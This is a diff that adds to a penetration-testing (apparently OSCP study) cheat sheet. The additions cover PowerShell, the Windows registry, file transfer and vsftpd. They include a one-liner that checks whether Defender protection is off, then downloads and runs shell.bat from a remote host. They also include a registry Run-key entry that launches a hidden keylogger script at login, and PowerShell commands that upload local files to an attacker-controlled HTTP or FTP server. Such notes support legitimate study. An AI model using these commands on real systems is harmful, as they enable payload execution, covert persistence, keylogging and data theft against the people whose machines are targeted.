@@ -17,11 +17,15 @@
 - [Bug Bounty](#bug-bounty)
   - [Authentication](#authentication)
 - [Tools](#tools)
+  - [powershell](#powershell)
+  - [registry](#registry)
+  - [SQLMAP](#SQLMAP)
   - [burp suite](#burpsuite)
   - [foxyproxy](#foxyproxy)
   - [pdfid](#pdfid)
   - [sqsh](#sqsh)
   - [file transfer](#file-transfer)
+  - [vsftpd](#vsftpd)
   - [ligolo](#ligolo)
   - [netcat](#netcat)
   - [tcpdump](#tcpdump)
@@ -1163,6 +1167,22 @@ Use .php extension and magic byte for png and add php code somewhere in the orig
 
 
 ## Tools
+### Powershell
+```bash
+# 1. Check Windows Defender & RealTimeProtectionEnabled property
+powershell -Command "if (Get-MPComputerStatus | where-object {$_.RealTimeProtectionEnabled -like 'False'}) {Invoke-WebRequest -URI http://192.168.56.101:8000/shell.bat -Outfile C:\Windows\temp\shell.bat; C:\Windows\temp\shell.bat}"
+
+```
+
+
+### Registry
+```bash
+# Add files as a startfile
+# SOFTWARE\Microsoft\Windows\CurrentVersion\Run is a common key used to specify programs that should run when the user logs in.
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "KeyLogger" /t REG_SZ /F /D "powershell.exe -WindowStyle hidden -file C:\Windows\Temp\Keylogger.ps1"
+
+```
+
 ### SQLMAP
 1. First, copy and create a file from burpsuite request
 ![image](https://github.com/nurijeon/OSCP/assets/14031269/7111ba2a-e78f-4938-9435-317ce186a71f)
@@ -1371,6 +1391,7 @@ EXEC master..xp_dirtree '\\10.10.110.17\share\'
 ```
 
 ### file transfer
+- Through Web(Transfer Files From Windows to Kali)
 https://juggernaut-sec.com/windows-file-transfers-for-hackers/#Uploading_Files_to_Attackers_HTTP_Server
 ```bash
 # From Windows to kali
@@ -1380,10 +1401,37 @@ SimpleHTTPServerWithUpload.py
 (New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/', 'C:\temp\supersecret.txt')
 or cmd
 powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://172.16.1.30/upload.php', 'C:\temp\supersecret.txt')"
+```
+- Through vsftpd(Transfer Files From Windows to Kali)
+```bash
+1. Download vsftpd (apt install vsftpd)
+apt install vsftpd
 
+2. Uncomment "write_enable=True" from /etc/vsftpd.conf
+
+3. Run vsftpd
+systemctl restart vsftpd
+
+4. Run powershell script to uplaod file to vsftpd
+$client = New-Object System.Net.WebClient
+$client.Credentials = New-Object System.Net.NetworkCredential("user", "parrot")
+$client.UploadFile("ftp://192.168.56.101/home/user/hi.txt","C:\Users\User\Desktop\history")
+```
+
+### vsftpd
+```bash
+1. Download vsftpd
+sudo apt install vsftpd
+2. Allow write from config file /etc/vsftpd.conf
+write_enable=True
+3. Restart
+sudo systemctl restart vsftpd
+4. Test it
+ftp localhost
 
 
 ```
+
 
 ### ligolo
 ```bash
